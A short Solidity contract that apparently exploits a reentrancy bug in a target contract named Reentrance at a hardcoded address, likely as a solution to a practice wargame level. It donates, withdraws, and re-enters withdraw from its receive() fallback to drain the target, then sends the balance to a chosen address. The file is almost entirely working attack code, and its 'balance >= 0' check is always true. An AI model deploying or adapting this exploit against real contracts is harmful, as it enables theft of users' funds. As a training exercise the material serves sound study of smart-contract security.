// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import '../src/Reentrancy.sol';

contract ReentrancyScript {
  Reentrance target = Reentrance(payable(0xa2781d8D150c9247B6d42766F855ae4E23c6A3d1));

  constructor() payable {

  }

  function attack() payable external {
    target.donate{value: 0.001 ether}(address(this));
  }

  function withdraw() external {
    target.withdraw(0.001 ether);
  }

  function refund(address myaddr) external {
    myaddr.call{value: address(this).balance}("");
  }

  receive() external payable {
    if (address(target).balance >= 0) { 
      target.withdraw(msg.value);
    }
  }
}
